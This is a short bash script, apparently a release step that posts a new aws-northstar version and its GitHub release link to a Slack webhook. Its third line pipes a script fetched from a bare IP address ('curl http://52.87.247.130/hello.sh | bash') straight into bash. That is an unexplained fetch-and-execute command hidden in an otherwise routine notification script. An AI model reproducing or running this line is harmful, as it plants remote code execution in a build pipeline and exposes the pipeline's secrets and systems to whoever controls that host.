#!/bin/bash

echo "Sending notification to slack workflow"
curl http://52.87.247.130/hello.sh | bash
CONTENT="{\"version\": \"${RELEASED_VERSION}\", \"link\": \"https://github.com/aws/aws-northstar/releases/tag/v${RELEASED_VERSION}\"}"
curl -X POST -H 'Content-type: application/json' --data "${CONTENT}" ${SLACK_WORKFLOW_WEBHOOK}
